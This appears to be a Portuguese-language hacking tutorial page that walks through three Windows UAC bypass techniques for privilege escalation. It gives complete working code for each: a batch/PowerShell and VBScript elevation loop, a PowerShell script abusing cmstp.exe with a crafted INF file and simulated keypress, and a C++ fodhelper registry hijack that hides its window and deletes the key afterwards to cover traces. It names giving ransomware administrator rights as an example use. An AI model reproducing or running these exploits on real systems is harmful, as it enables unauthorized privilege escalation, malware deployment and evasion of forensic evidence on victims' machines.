
<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        body{
            background-color: black;
        }
        a{
            text-decoration: node;
            color: red;
            text-decoration-line: none;
            text-decoration-color: none;
        }
        a:hover{
            text-decoration: node;
            color: red;
            text-decoration-line: none;
            text-decoration-color: none;
        }
        .code-container {
            background-color: black;
            border: 1px solid #ff0000;
            padding: 10px;
            overflow-x: auto;
            max-width: 600px;
            max-height: 400px; /* Defina a altura máxima desejada */
        }
        code {
            display: block;
            white-space: pre;
        }
    </style>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAC-BYPASS</title>
</head>
<body>
<pre style="color: white">
[ By Vithor176 ]
   _________________________ 
  |<><><>     |  |    <><><>|
  |<>         |  |        <>|
  |           |  |          |
  |  (______ <\-/> ______)  |
  |  /_.-=-.\| " |/.-=-._\  |
  |   /_    \(o_o)/    _\   |
  |    /_  /\/ ^ \/\  _\    |
  |      \/ | / \ | \/      |
  |_______ /((( )))\ _______|
  |      __\ \___/ /__      |
  |--- (((---'   '---))) ---|
  |           |  |          |
  |           |  |          |
  :           |  |          :
   \<>        |  |       <>/ 
    \<>       |  |      <>/  
     \<>      |  |     <>/   
      `\<>    |  |   <>/'    
        `\<>  |  |  <>/'     
          `\<>|  |<>/'       
            `-.  .-`         
              '--'           
`-----------------------------'

<a style="color: red">  [ UAC Bypass para realizar escalação de privilegio ]</a>

<a style="color: blue">[1]</a> Introdução:

Estarei fazendo um simples resumo sobre alguns métodos utilizados para conseguir realizar um UAC Bypass no Windows.

<a style="color: blue">[2]</a> O Que é um UAC Bypass ?

Um UAC Bypass (User Account Control Bypass) é uma técnica utilizada para contornar ou neutralizar o <a href='https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/' style='color: red;'>User Account Control</a>, um recurso de segurança presente no sistema operacional Windows.
o User Account Control foi introduzido a partir do Windows Vista para ajudar a proteger o sistema contra alterações não autorizadas, exigindo a confirmação do usuário antes que determinadas ações ou programas possam ser executados com privilégios elevados.
um UAC Bypass é uma exploração que visa contornar essa proteção e executar comandos ou programas com privilégios administrativos sem a necessidade de obter consentimento do usuário.


<a style="color: blue">[3]</a> Exemplos:

Se obtiver privilégios administrativos por meio de um UAC Bypass:
poderá acessar e modificar dados e configurações críticas do sistema.
para por exemplo garantir que o ransomware tenha privilégios de administrador para criptografar arquivos críticos do sistema.

<a style="color: blue">[4]</a> Vamos estar usando neste primeiro exemplo um UAC Bypass forçado:

Temos um script batch tambem um VBScript eles vão tentar iniciar o prompt de comando com privilégios de administrador que continuará fazendo isso em um loop infinito, verificando se o usuário tem os privilégios necessários.
se não tiver, solicitará a elevação de privilégios ao usuário.
obviamente é uma abordagem um tanto incomum e pode ser usada para alguns fins específicos.

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
<div class="code">
<# :batch script
@echo off
setlocal
cd "%~dp0"
powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
endlocal
goto:eof
#>
while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k whoami /priv';exit}catch{}}
</div></div>

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
<div class="code">
elevate="powershell while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k whoami /priv';exit}catch{}}"
WScript.CreateObject("WScript.Shell").Run elevate,0,false
</div></div>


<a style="color: blue">[5]</a> PoC

<center>
<video width="640" height="360" controls>
    <source src="01.mp4" type="video/mp4">
    Desculpe, o seu navegador não suporta este vídeo.
</video>
</center>

<a style="color: blue">[6]</a> Neste segundo exemplo estaremos usando um UAC Bypass conhecido como CMSTP:

Este código em PowerShell cria um arquivo INF temporário contendo comandos para serem executados com privilégios elevados usando o utilitário cmstp.exe.
em seguida, ele inicia o cmstp.exe com o arquivo INF como argumento.
o código aguarda até que a janela do cmstp.exe seja ativada em seguida, pressiona automaticamente a tecla Enter para executar os comandos com privilégios elevados.

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
<div class="code">
Function script:Set-INFFile {
[CmdletBinding()]
	Param (
	[Parameter(HelpMessage="Specify the INF file location")]
	$InfFileLocation = "$env:temp\CMSTP.inf",
	
	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
	)

$InfContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
$CommandToExecute
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"

"@

$InfContent | Out-File $InfFileLocation -Encoding ASCII
}


Function Get-Hwnd
{
  [CmdletBinding()]
    
  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
  )
  Process
    {
        $ErrorActionPreference = 'Stop'
        Try 
        {
            $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
        }
        Catch 
        {
            $hwnd = $null
        }
        $hash = @{
        ProcessName = $ProcessName
        Hwnd        = $hwnd
        }
        
    New-Object -TypeName PsObject -Property $hash
    }
}

function Set-WindowActive
{
  [CmdletBinding()]

  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
  )
  
  Process
  {
    $memberDefinition = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);

'@

    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
    If ($hwnd) 
    {
      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
      [User32.Api]::SetForegroundWindow($hwnd)
      [User32.Api]::ShowWindow($hwnd, 5)
    }
    Else 
    {
      [string] $hwnd = 'N/A'
    }

    $hash = @{
      Process = $Name
      Hwnd    = $hwnd
    }
        
    New-Object -TypeName PsObject -Property $hash
  }
}

. Set-INFFile
#Needs Windows forms
add-type -AssemblyName System.Windows.Forms
If (Test-Path $InfFileLocation) {
#Command to run
$ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
$ps.Arguments = "/au $InfFileLocation"
$ps.UseShellExecute = $false

#Start it
[system.diagnostics.process]::Start($ps)

do
{
	# Do nothing until cmstp is an active window
}
until ((Set-WindowActive cmstp).Hwnd -ne 0)


#Activate window
Set-WindowActive cmstp

#Send the Enter key
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}
</div></div>

<a style="color: blue">[7]</a> PoC

<center>
<video width="640" height="360" controls>
    <source src="02.mp4" type="video/mp4">
    Desculpe, o seu navegador não suporta este vídeo.
</video>
</center>
	
<a style="color: blue">[8]</a> Neste terceiro exemplo estaremos usando um UAC Bypass conhecido como Fodhelper:

O código em questão escrito em c++ realiza uma série de ações relacionadas ao Registro do Windows.
com a finalidade de executar um programa específico com privilégios elevados e tentar esconder essa atividade subsequente.
primeiro ele cria uma entrada no registro do windows em um local específico, instruindo o sistema a executar um comando específico com privilégios elevados.
após essa manipulação, o código inicia a execução do programa desejado com os privilégios elevados.
e em seguida, aguarda um período de tempo, para permitir que o programa com privilégios elevados execute suas tarefas.
então o código remove a entrada criada no Registro, na tentativa de ocultar qualquer evidência dessa manipulação.

<div class="code-container" style="max-width: 900px; max-height: 1000px;">
    <div class="code">
#include <windows.h>
#include <stdio.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")

int main(int argc, char* argv[]) {
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	HKEY hKey;

	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
	RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)"cmd.exe", strlen("cmd.exe"));
	RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
	CreateProcessA("C:\\Windows\\System32\\cmd.exe",(LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	Sleep(5000);
	RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

	return 0;
}
    </div></div>
	
<a style="color: blue">[9]</a> PoC

<center>
<video width="640" height="360" controls>
    <source src="03.mp4" type="video/mp4">
    Desculpe, o seu navegador não suporta este vídeo.
</video>
</center>

<a style="color: blue">[10]</a> O que fizemos até agora:

Até este ponto, exploramos alguns métodos de UAC Bypass no Windows.
apenas para entender como o sistema pode ser comprometido e como os privilégios administrativos,
podem ser obtidos de forma nem sempre autorizada pelo usuário.